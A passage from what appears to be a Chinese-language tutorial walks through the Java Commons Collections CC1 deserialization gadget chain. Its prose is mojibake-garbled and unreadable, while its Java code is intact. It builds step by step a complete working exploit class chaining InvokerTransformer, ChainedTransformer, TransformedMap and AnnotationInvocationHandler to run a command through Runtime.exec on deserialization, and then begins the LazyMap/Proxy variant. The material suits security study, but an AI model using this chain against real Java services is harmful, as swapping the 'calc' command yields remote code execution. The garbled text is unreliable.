Object[]{\"calc\"}).transform(currentRuntime);\n\næˆ‘ä»¬æ¥ç€æ‰¾å¯åˆ©ç”¨çš„ç±»ï¼Œç†æƒ³æƒ…å†µä¸‹å¦‚æœæœ‰ä¸€ä¸ªç±»çš„readObjectæ–¹æ³•ä¸­è°ƒç”¨äº†Invokertransformer.transformï¼Œé‚£ä¹ˆè¿™ä¸ªç±»å°±æ˜¯æˆ‘ä»¬ååºåˆ—åŒ–çš„èµ·ç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰æ‰¾åˆ°ä¸€ä¸ªè¿™æ ·çš„ç±»ï¼Œæ‰€ä»¥æ¥ç€å‘ä¸‹æ‰¾è°ƒç”¨äº†Invokertransformer.transformçš„å…¶ä»–ç±»ã€‚\nä¸‹ä¸€ä¸ªå¯åˆ©ç”¨çš„ç±»å°±æ˜¯Commons Collectionsä¸­çš„TransformedMap\nç±»ï¼š\n\næˆ‘ä»¬ä¸»è¦çœ‹TransformedMapçš„æ„é€ å‡½æ•°å’Œdecorateæ–¹æ³•ï¼š\n protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {     super(map);     this.keyTransformer = keyTransformer;     this.valueTransformer = valueTransformer; }public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {     return new TransformedMap(map, keyTransformer, valueTransformer); }\n\nTransformedMapçš„æ„é€ æ–¹æ³•ä¸ºprotectedï¼Œå› æ­¤æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•decorateæ¥ä½¿ç”¨å®ƒçš„æ„é€ æ–¹æ³•ï¼Œdecorateæ¥å—ä¸€ä¸ªmapï¼Œä¸¤ä¸ªTransfoemerï¼Œå¹¶å¯¹è¿™ä¸¤ä¸ªTransformeråšäº†ä¸€ä¸ªâ€œè£…é¥°â€æ“ä½œã€‚\nTransformedMapä¸­æ‰¾åˆ°checkSetValueè°ƒç”¨äº†Invokertransformer.transformï¼š\nprotected Object checkSetValue(Object value) {        return valueTransformer.transform(value);    }\n\næˆ‘ä»¬å°†ä¸Šé¢å¼¹è®¡ç®—å™¨çš„payloadæ¯”å¯¹ä¸€ä¸‹ï¼š\nnew InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);\n\nä¹Ÿå°±æ˜¯è¯´å¦‚æœcheckSetValueä¸­ï¼Œæˆ‘ä»¬å°†valueTransformeræ›¿æ¢æˆInvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})ï¼Œå†å°†transformçš„å‚æ•°æ›¿æ¢æˆRuntimeå¯¹è±¡ï¼Œå°±å¯ä»¥æ›¿ä»£ä¸Šé¢çš„å†™æ³•ã€‚æƒ³è¦æ›¿ä»£valueTransformerå¯ä»¥é€šè¿‡è°ƒç”¨TransformedMap.decorateå°†InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})èµ‹å€¼ç»™valueTransformerï¼Œä¿®æ”¹payloadå¦‚ä¸‹ï¼š\nInvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});        HashMap map = new HashMap();        TransformedMap.decorate(map,null,invokerTransformer);\n\næˆ‘ä»¬å†æ¥çœ‹æ€ä¹ˆè®©valueå¯æ§ï¼Œé¦–å…ˆè¦æ‰¾è°ƒç”¨checkSetValueçš„æ–¹æ³•ï¼š\næˆ‘ä»¬é”å®šæŠ½è±¡ç±»AbstractInputCheckedMapDecorator.MapEntryï¼ŒæŸ¥çœ‹å®ƒçš„setValueæ–¹æ³•ï¼Œå¹¶ä¸”TransformedMapæ˜¯è¯¥æŠ½è±¡ç±»çš„å®ç°ç±»ï¼š\n\n\nstatic class MapEntry extends AbstractMapEntryDecorator {       /** The parent map */       private final AbstractInputCheckedMapDecorator parent;       protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {           super(entry);           this.parent = parent;       }       public Object setValue(Object value) {           value = parent.checkSetValue(value);           return entry.setValue(value);       }   }\n\næˆ‘ä»¬å‘ç°å¯ä»¥é€šè¿‡è°ƒç”¨setValue(currentRuntime)æ–¹æ³•æ¥è§¦å‘å…¶ä¸­çš„checkSetvalueï¼Œæˆ‘ä»¬ç°åœ¨éœ€è¦ä¸€ä¸ªentryæ¥è°ƒç”¨å®ƒçš„setValueæ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œéå†ä¸€ä¸ªMapï¼Œè·å–å®ƒçš„entryï¼š\nmap.put(\"k\",\"v\");for (Map.Entry entry:transformedMap.entrySet())       {               entry.setValue(currentRuntime);       }\n\npayloadæ­¤æ—¶ä¿®æ”¹ä¸ºï¼š\nRuntime currentRuntime = Runtime.getRuntime();   InvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});   HashMap map = new HashMap();   map.put(\"k\",\"v\");\t\t\t//éšä¾¿ç»™mapå­˜ä¸€å¯¹k-v å¦åˆ™éå†æ—¶mapä¸ºç©º æ‹¿ä¸åˆ°entry   Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);   for (Map.Entry entry:transformedMap.entrySet()) //entrySetå¯ä»¥å°†mapä¸­çš„é”®å€¼å¯¹ä»¥setå‚¨å­˜èµ·æ¥   {           entry.setValue(currentRuntime);   }\n\næˆ‘ä»¬æ¥ç€æ‰¾setValueåœ¨å…¶ä»–ä½ç½®çš„è°ƒç”¨\n\nè¿™é‡Œæˆ‘ä»¬éœ€è¦å¯¹ç¯å¢ƒåšä¸€ç‚¹å°é…ç½®ï¼Œç”±äºä¸‹ä¸€ä¸ªå¯åˆ©ç”¨ç±»AnnotationInvocationHandleræ˜¯ç›´æ¥åç¼–è¯‘å‡ºæ¥çš„ï¼Œåœ¨æŸ¥æ‰¾ç”¨æ³•æ—¶æ‰¾ä¸åˆ°è¿™ä¸ªç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°†AnnotationInvocationHandlerçš„javaæ–‡ä»¶æ·»åŠ åˆ°jdkä¸­\n\næˆ‘ä»¬å…ˆåœ¨openjdkæ‰¾åˆ°æœ‰æ¼æ´çš„javaç‰ˆæœ¬ï¼šjdk8u/jdk8u/jdk: af660750b2f4 (java.net)\nåœ¨ä¸‹è½½å¥½çš„jdkä¸­æ‰¾åˆ°sunåŒ… è·¯å¾„ä¸ºjdk-af660750b2f4\\\\jdk-af660750b2f4\\\\src\\\\share\\\\classes\næˆ‘ä»¬æ‰¾åˆ°ysoserialä½¿ç”¨çš„jdk8u65çš„ç›®å½•ï¼Œè¿™é‡Œä¸€èˆ¬åˆ†ä¸¤ä¸ªæƒ…å†µ\nç›®å½•ä¸‹æœ‰src.zipï¼Œåˆ©ç”¨è§£å‹å·¥å…·è§£å‹åå°†ä¸Šä¸€æ­¥æ‰¾åˆ°çš„sunåŒ…copyä¸€ä»½åˆ°srcé‡Œ\nç›®å½•ä¸‹æ²¡æœ‰src.zipï¼Œæˆ‘ä»¬å…ˆåœ¨jdk1.8 u65\\\\ä¸‹æ–°å»ºä¸€ä¸ªsrcæ–‡ä»¶å¤¹ï¼Œå†åœ¨jdk1.8 u65\\\\jre\\\\libä¸‹æ‰¾åˆ°rt.jarï¼Œæ³¨æ„è¿™é‡Œä¸è¦ç”¨java -jarè¿›è¡Œè§£å‹ï¼Œç›´æ¥ç”¨7zipç­‰è§£å‹å·¥å…·è§£å‹å³å¯ï¼Œè§£å‹åå°†é‡Œé¢çš„æ‰€æœ‰ä¸œè¥¿æ”¾åœ¨jdk1.8 u65\\\\srcä¸‹ï¼Œå†å°†ä¸Šä¸€æ­¥çš„sunåŒ…copyåˆ°srcä¸­\n\n\næœ€åå†åœ¨ideaä¸­å·¦ä¸Šè§’ æ–‡ä»¶ - é¡¹ç›®ç»“æ„ï¼Œåœ¨SDKçš„æºè·¯å¾„ï¼ˆsource pathï¼‰ä¸­æ·»åŠ srcæ–‡ä»¶å¤¹å³å¯\n\n\n\næŸ¥æ‰¾setValueçš„è°ƒç”¨ï¼Œå‘ç°åœ¨AnnotationInvocationHandlerçš„readObjectä¸­è°ƒç”¨äº†setValueï¼Œè·Ÿè¿›æŸ¥çœ‹ï¼š\n\nreadObjectä¸­æœ‰ä¸€ä¸ªéå†mapçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªåŠŸèƒ½ä»£æ›¿æˆ‘ä»¬ä¸Šé¢æ‰‹åŠ¨éå†mapæ‹¿entryçš„æ“ä½œäº†ï¼š\n    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) {        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();        if (!type.isAnnotation() ||            superInterfaces.length != 1 ||            superInterfaces[0] != java.lang.annotation.Annotation.class)            throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\");        this.type = type;        this.memberValues = memberValues;    }private void readObject(java.io.ObjectInputStream s)        throws java.io.IOException, ClassNotFoundException {        s.defaultReadObject();        // Check to make sure that types have not evolved incompatibly        AnnotationType annotationType = null;        try {            annotationType = AnnotationType.getInstance(type);        } catch(IllegalArgumentException e) {            // Class is no longer an annotation type; time to punch out            throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");        }        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();        // If there are annotation members without values, that        // situation is handled by the invoke method.        //membersValueæ˜¯æ„é€ å‡½æ•°æ¥æ”¶åˆ°çš„ä¸€ä¸ªMap        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) {            String name = memberValue.getKey();            Class&lt;?&gt; memberType = memberTypes.get(name);            if (memberType != null) {  // i.e. member still exists                Object value = memberValue.getValue();                if (!(memberType.isInstance(value) ||                      value instanceof ExceptionProxy)) {                    memberValue.setValue(                        new AnnotationTypeMismatchExceptionProxy(                            value.getClass() + \"[\" + value + \"]\").setMember(                                annotationType.members().get(name)));                }            }        }    }\n\npayloadä¿®æ”¹ä¸ºï¼š\nRuntime currentRuntime = Runtime.getRuntime();       InvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});       HashMap map = new HashMap();       map.put(\"k\",\"v\");       Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);       Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");//AnnotationInvocationHandlerç±»ä¸ºdefault ä¸èƒ½ç›´æ¥è®¿é—® è¦é€šè¿‡åå°„è·å–       Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);//è·å–æ„é€ å‡½æ•°       annotationInvocationHandlerconstructor.setAccessible(true); //å®ä¾‹åŒ–       Object o = annotationInvocationHandlerconstructor.newInstance(Override.class,transformedMap);//æ„é€ å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ³¨è§£ç±»å‹çš„calssï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºMapç±»å‹çš„classï¼Œä¹Ÿå°±æ˜¯readObjectä¸­éå†Mapæ—¶çš„memberValues    serialize(o);       unserialize(\"ser.bin\");\n\n\nä½†æ˜¯è¿™é‡Œæœ‰å‡ ä¸ªé—®é¢˜ï¼š\n\n\n\nmemberValue.setValue(                        new AnnotationTypeMismatchExceptionProxy(                            value.getClass() + \"[\" + value + \"]\").setMember(                                annotationType.members().get(name)));\n\nè¿™é‡Œå¯¹setValueä¼ è¿›å»çš„å‚æ•°åº”è¯¥æ˜¯currentRuntimeï¼Œä½†æˆ‘ä»¬å‘ç°è¿™ä¸ªæ–¹æ³•å†…çš„å‚æ•°å€¼æˆ‘ä»¬ä¸ç¡®å®šèƒ½ä¸èƒ½æ§åˆ¶\n2.\ncurrentRuntimeæ˜¯æˆ‘ä»¬è‡ªå·±é€šè¿‡getRuntimeæ–¹æ³•å¾—åˆ°çš„ï¼Œä½†Runtimeå¯¹è±¡å¹¶æ²¡æœ‰ç»§æ‰¿Serializableï¼Œæ‰€ä»¥åœ¨ååºåˆ—åŒ–æ—¶ç›´æ¥ä¼ å…¥currentRuntimeä¼šå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥\nif (memberType != null) {  // i.e. member still exists               Object value = memberValue.getValue();               if (!(memberType.isInstance(value) ||                     value instanceof ExceptionProxy))                     memberValue.setValue\n\nåœ¨æ‰§è¡ŒsetValueå‰éœ€è¦ç»•è¿‡ä¸¤ä¸ªifåˆ¤æ–­\n\næˆ‘ä»¬å…ˆæ¥è§£å†³ç¬¬äºŒä¸ªé—®é¢˜ï¼ŒRuntimeä¸èƒ½åºåˆ—åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨Runtime.classæ¥ä»£æ›¿å®ƒï¼Œå› ä¸ºClassç±»ä¸­ç»§æ‰¿äº†Serializableï¼Œæˆ‘ä»¬å…ˆå†™ä¸€ä¸ªåå°„å¼¹è®¡ç®—å™¨çš„paylaodç„¶åä¿®æ”¹ä¸€ä¸‹\nClass runtime = Runtime.class;Method execMethod = runtime.getMethod(\"exec\", String.class);Method getRuntime = runtime.getMethod(\"getRuntime\");execMethod.invoke(getRuntime.invoke(null,null),\"calc\");\n\né€šè¿‡InvokerTransformerè·å–getRuntimeæ–¹æ³•ï¼š\nMethod getRuntime = (Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);\n\næˆ‘ä»¬åˆ©ç”¨InvokerTransformeræ‰§è¡Œä»»æ„ä»£ç çš„ç‰¹ç‚¹æ‰§è¡Œäº†getMethodæ–¹æ³•ï¼Œå¹¶ä¸”å‚æ•°ä¸ºgetRuntimeï¼Œæœ€ç»ˆæ‹¿åˆ°äº†getRuntimeæ–¹æ³•\næ¥ä¸‹æ¥æˆ‘ä»¬å†åˆ©ç”¨InvokerTransformeré€šè¿‡æ‰§è¡Œinvokeæ–¹æ³•æ¥è°ƒç”¨getRuntimeæ–¹æ³•ï¼š\nRuntime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntime);\n\nå†é€šè¿‡åå°„å¼¹è®¡ç®—å™¨å°±å¯ä»¥äº†ï¼Œpayloadä¿®æ”¹å¦‚ä¸‹ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªè°ƒç”¨é“¾ç±»ä¼¼äºä¸€ä¸ªé¦–å°¾ç›¸è¿çš„ç»“æ„ï¼Œä¸Šä¸€ä¸ªtransformerä¼ å…¥ä¸‹ä¸€ä¸ªè¿›è¡Œè°ƒç”¨ï¼š\nMethod getRuntime = (Method) new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}).transform(Runtime.class);Runtime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntime);new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);\n\njavaä¸­åˆšå¥½æœ‰ä¸€ä¸ªTransformerå¯ä»¥è®©ä»–ä»¬ä¸²èµ·æ¥ï¼Œå½¢æˆè¿™æ ·ä¸€ä¸ªé“¾å¼è°ƒç”¨ç»“æ„ï¼Œè¿™æ ·å°±å¯ä»¥æ›´ä¼˜é›…çš„æ‰§è¡Œpayloadï¼Œå°±æ˜¯ChainedTransformerï¼Œæˆ‘ä»¬å°†ä¸Šé¢çš„ä¸‰ä¸ªtransformerä»¥æ•°ç»„æ ¼å¼ä¼ å…¥ï¼š\nChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{            new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),            new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),            new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})        });        chainedTransformer.transform(Runtime.class);\n\nè¿™æ ·è¿™ä¸ªé—®é¢˜å°±è§£å†³äº†ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸€ä¸²payloadç»“åˆåŸå…ˆçš„payloadè¿›è¡Œæ›¿æ¢ï¼š\n ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{            new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),            new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),            new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})        });\t   HashMap map = new HashMap();        map.put(\"k\",\"v\");Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);        annotationInvocationHandlerconstructor.setAccessible(true);        Object o = annotationInvocationHandlerconstructor.newInstance(Override.class,transformedMap);        serialize(o);        unserialize(\"ser.bin\");\n\næˆ‘ä»¬å‘ç°å¹¶ä¸èƒ½æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦è§£å†³æˆ‘ä»¬çš„å¦å¤–ä¸¤ä¸ªé—®é¢˜äº†ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªåˆ¤æ–­åšäº†ä»€ä¹ˆäº‹\nprivate void readObject(java.io.ObjectInputStream s)    throws java.io.IOException, ClassNotFoundException {    s.defaultReadObject();    // Check to make sure that types have not evolved incompatibly    AnnotationType annotationType = null;    try {        annotationType = AnnotationType.getInstance(type); //typeä¸ºOverride    } catch(IllegalArgumentException e) {        // Class is no longer an annotation type; time to punch out        throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");    }    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); //è·å–Overrideä¸­çš„æˆå‘˜å˜é‡    // If there are annotation members without values, that    // situation is handled by the invoke method.    for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) {        String name = memberValue.getKey();        Class&lt;?&gt; memberType = memberTypes.get(name); //å¿…é¡»ä½¿è¿”å›å€¼ä¸ä¸ºnull ä¹Ÿå°±æ˜¯memberTypesä¸­è¦æœ‰name        \t\t\t\t\t\t\t\t\t\t // æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®©nameä¸ºAnnotionå†…éƒ¨çš„å˜é‡å€¼        if (memberType != null) {  // i.e. member still exists            Object value = memberValue.getValue();            if (!(memberType.isInstance(value) ||                  value instanceof ExceptionProxy)) {                memberValue.setValue(                    new AnnotationTypeMismatchExceptionProxy(                        value.getClass() + \"[\" + value + \"]\").setMember(                            annotationType.members().get(name)));            }        }    }}\n\né¦–å…ˆç¬¬ä¸€ä¸ªifåˆ¤æ–­memberTypeæ˜¯å¦ä¸ºç©ºï¼ŒmemberTypeæ˜¯æ„é€ å‡½æ•°ä¼ å…¥è¿›æ¥çš„Annotationçš„æˆå‘˜å˜é‡ï¼Œnameæ˜¯ä»æ„é€ å‡½æ•°ä¼ å…¥çš„mapéå†æ—¶è·å–çš„keyï¼Œä¸Šé¢ä»£ç çš„æ³¨é‡Šä¸­æåˆ°äº†å¦‚æœè¦ç»•è¿‡è¿™å±‚ifï¼Œæˆ‘ä»¬ä¼ å…¥çš„mapçš„keyä¸­å°±å¿…é¡»è¦æœ‰ä¼ å…¥çš„Annotationçš„å˜é‡å€¼ï¼Œä½†Overrideå†…éƒ¨æ²¡æœ‰å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨Targetï¼Œå¹¶ä¸”å°†å…¶ä¸­çš„valueå±æ€§å­˜å…¥åˆ°mapä¸­å»\n\n\nmap.put(\"value\",\"v\");Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);\n\næˆ‘ä»¬å†çœ‹ç¬¬äºŒå±‚ifï¼ŒmemberTypeæ˜¯ä¸€ä¸ªAnnotationï¼Œè€Œvalueæ˜¯ä¸€ä¸ªVï¼ˆé”®å€¼å¯¹ä¸­çš„Valueç±»ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è¿”å›falseï¼Œé€šè¿‡ç¬¬äºŒå±‚ifï¼š\nObject value = memberValue.getValue();if (!(memberType.isInstance(value) ||                      value instanceof ExceptionProxy )) {                    memberValue.setValue(                        new AnnotationTypeMismatchExceptionProxy(                            value.getClass() + \"[\" + value + \"]\").setMember(                                annotationType.members().get(name)));                }\n\nå‰©ä¸‹çš„æœ€åä¸€ä¸ªé—®é¢˜ï¼Œç°åœ¨setValueä¸­ä¼ å…¥çš„ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œè¿™æ—¶æˆ‘ä»¬éœ€è¦å¦å¤–ä¸€ä¸ªTransformerï¼ŒConstantTransformerï¼Œ\nå®ƒçš„transformæ–¹æ³•ä¸è®ºæ¥æ”¶ä»€ä¹ˆå¯¹è±¡ï¼Œéƒ½å¯ä»¥åŸå°ä¸åŠ¨çš„è¾“å‡ºä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„å€¼ï¼š\npublic ConstantTransformer(Object constantToReturn) {    super();    iConstant = constantToReturn;}public Object transform(Object input) {    return iConstant;}\n\næ‰€ä»¥æœ€ç»ˆpayloadä¿®æ”¹ä¸ºï¼š\npublic class CC1Test {    public static void main(String[] args) throws Exception {        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{            new ConstantTransformer(Runtime.class),            new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),            new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),            new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})        });//        chainedTransformer.transform(Runtime.class);//        InvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});        HashMap map = new HashMap();        map.put(\"value\",\"v\");        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);        annotationInvocationHandlerconstructor.setAccessible(true);        Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);        serialize(o);        unserialize(\"ser.bin\");//        Method getRuntime = (Method) new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}).transform(Runtime.class);//        Runtime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntime);//        new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);    }    public static void serialize(Object obj) throws IOException    {        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));        oos.writeObject(obj);    }    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException    {        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    }}\n\næˆ‘ä»¬æŠŠé“¾å­å€’ç€æ¨äº†ä¸€éï¼Œåœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™æ˜¯ä»æˆ‘ä»¬ç¼–å†™payloadçš„æœ€åå¼€å§‹è§¦å‘çš„ï¼Œä¹Ÿå°±æ˜¯AnnotationInvocationHandlerçš„readObjectæ–¹æ³•ï¼Œå¦‚æœè¿˜æœ‰ä¸æ‡‚çš„åœ°æ–¹å¯ä»¥ä¸‹æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ã€‚\nç¬¬äºŒæ¡é“¾å­ï¼šæˆ‘ä»¬åœ¨ç¬¬ä¸€æ¡é“¾å­ä¸­æ‰¾InvokerTransformer.transformçš„ä¸‹ä¸€è°ƒç”¨æ—¶å½“æ—¶æ‰¾åˆ°äº†ä¸¤ä¸ªMapï¼Œä½†åæ¥æˆ‘ä»¬å°†ä¸‰ä¸ªInvokerTransfomerå°è£…è¿›äº†ä¸€ä¸ªChainedTransformerä¸­ï¼Œæ‰€ä»¥å…¶å®åœ¨ChainedTransformerçš„trnasformä¸­è°ƒç”¨çš„è¿˜æ˜¯InvokerTransformerçš„transformæ–¹æ³•ï¼Œå› æ­¤æ‰¾InvokerTransformer.transformå’Œæ‰¾ChainedTransformer.transformçš„åç»­ç”¨æ³•æ˜¯ä¸€æ ·çš„,ç¬¬ä¸€æ¡é“¾ä¸­åˆ©ç”¨çš„æ˜¯TransformedMapï¼Œè¿˜æœ‰å¦å¤–ä¸€ä¸ªLazyMapï¼Œå…¶ä¸­çš„getæ–¹æ³•è°ƒç”¨äº†transformï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œè·Ÿä¸‹å»ï¼š\npublic ChainedTransformer(Transformer[] transformers) {    super();    iTransformers = transformers;}public Object transform(Object object) {        for (int i = 0; i &lt; iTransformers.length; i++) {            object = iTransformers[i].transform(object);        }        return object;    }\n\n\nçœ‹ä¸€ä¸‹LazyMapï¼Œgetæ–¹æ³•ä¸­å­˜åœ¨factory.transformï¼Œfactoryæ„é€ å‡½æ•°å¯æ§ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯å°†factoryä¼ å€¼ä¸ºChainedTransformerï¼Œå¹¶ä¸”è¿›å…¥ifåˆ¤æ–­ï¼Œmapä¸­æ²¡æœ‰keyæ‰ä¼šè§¦å‘transform:\nprotected LazyMap(Map map, Transformer factory) {    super(map);    if (factory == null) {        throw new IllegalArgumentException(\"Factory must not be null\");    }    this.factory = factory;}public Object get(Object key) {        // create value for key if key is not currently in the map        if (map.containsKey(key) == false) {            Object value = factory.transform(key);            map.put(key, value);            return value;        }        return map.get(key);    }\n\næˆ‘ä»¬æ¥ç€æ‰¾è°è°ƒç”¨äº†getï¼Œfindusagesç»“æœå…­åƒå¤šæ¡æˆ‘å°±ä¸æ‰¾äº†ï¼Œæœ€ç»ˆæ˜¯é”å®šåœ¨äº†AnnotationInvocationHandler.invokeä¸Šï¼ŒmemberValuesæ˜¯æ„é€ å‡½æ•°ä¼ å…¥çš„ä¸€ä¸ªMapï¼š\nObject result = memberValues.get(membjieker);\n\nAnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues)\n\nç”±äºAnnotationInvocationHandleræ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†è°ƒç”¨å¤„ç†å™¨ç±»ï¼Œå½“åœ¨åŠ¨æ€ä»£ç†ä¸­è°ƒç”¨AnnotationInvocationHandlerçš„æ–¹æ³•æ—¶å°±ä¼šè‡ªåŠ¨è°ƒç”¨invokeï¼Œè¿™é‡Œç»™å‡ºçš„æ˜¯AnnotationInvocationHandler.readObjectï¼Œå¯ä»¥è¯´æ˜¯å¾ˆå·§äº†ï¼Œé€šè¿‡è‡ªå·±è°ƒç”¨è‡ªå·±ï¼Œå…¶å®ç”¨å…¶ä»–çš„ç±»ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¹Ÿç®—æ˜¯ä¸€ä¸ªæ¯”è¾ƒæœ‰è¶£çš„ç‚¹ï¼Œæˆ‘ä»¬æ¥çœ‹è°ƒç”¨è¿‡ç¨‹ï¼š\n\nå…ˆçœ‹invokeï¼š\nif (member.equals(\"equals\") &amp;&amp; paramTypes.length == 1 &amp;&amp;    paramTypes[0] == Object.class)    return equalsImpl(args[0]);if (paramTypes.length != 0)    throw new AssertionError(\"Too many parameters for an annotation method\"); Object result = memberValues.get(member);\n\næƒ³è¦æ‰§è¡Œgetæ–¹æ³•æˆ‘ä»¬è¦ä¿è¯å‰é¢çš„ä¸¤ä¸ªifä¸èƒ½æ‰§è¡Œï¼Œé¦–å…ˆæ–¹æ³•åä¸èƒ½ä¸ºequalsï¼Œå¹¶ä¸”è¦æ˜¯ä¸€ä¸ªæ— å‚æ–¹æ³•ï¼Œåœ¨readObjectä¸­æ°å¥½è°ƒç”¨äº†memberValuesçš„entrySetæ–¹æ³•ï¼š\nfor (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet())\n\næˆ‘ä»¬æ­£å‘æ¢³ç†ä¸€ä¸‹æµç¨‹ï¼š\n\nå…±éœ€è¦ä¸¤ä¸ªAnnotationInvocationHandlerï¼Œç¬¬ä¸€ä¸ªAIHä¸­memberValuesä¸ºProxyï¼ˆä»£ç†äº†ç¬¬äºŒä¸ªAnnotationInvocationHandlerçš„åŠ¨æ€ä»£ç†ï¼‰ï¼Œè¿™æ ·é€šè¿‡è°ƒç”¨Proxy.entrySetæ¥è§¦å‘Proxyçš„invokeï¼ŒProxyä¸­AIHçš„memberValuesä¸ºLazyMapï¼Œåœ¨Proxyçš„invokeä¸­è°ƒç”¨äº†LazyMap.getï¼Œè§¦å‘ChainedTransformer.transformï¼Œå‰©ä¸‹çš„è§¦å‘ç‚¹å°±å’Œä¹‹å‰çš„ç¬¬ä¸€æ¡é“¾ä¸€æ ·äº†ã€‚\n\nå¼€å§‹æ“payloadï¼š\nç”±äºå‰é¢çš„Transformeréƒ¨åˆ†éƒ½ä¸€æ 